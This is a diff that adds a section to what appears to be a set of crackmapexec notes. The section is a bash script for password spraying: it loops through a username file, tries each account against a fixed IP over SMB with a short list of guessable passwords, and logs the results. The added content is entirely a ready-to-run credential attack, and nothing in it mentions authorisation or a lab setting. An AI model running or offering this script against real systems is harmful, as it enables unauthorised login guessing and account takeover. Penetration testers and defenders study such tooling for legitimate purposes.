@@ -54,4 +54,24 @@ crackmapexec
 ```
 
 
+## script 
+
+```bash
+#!/bin/bash
+
+USERLIST="userlist.txt"  # File containing usernames
+PASSWORDS=("Changeme08" "Changeme09" "Changeme07" "Password@123!")  # List of passwords
+TARGET="100.94.30.17"  # Target IP address
+OUTPUT_FILE="cme_output.txt"  # File to save results
+
+while read -r user; do
+    echo "Testing passwords for user: $user" | tee -a "$OUTPUT_FILE"
+    for password in "${PASSWORDS[@]}"; do
+        echo "Trying $user:$password" | tee -a "$OUTPUT_FILE"
+        crackmapexec smb $TARGET -u "$user" -p "$password" | tee -a "$OUTPUT_FILE"
+    done
+done < "$USERLIST"
+```
+
+
 
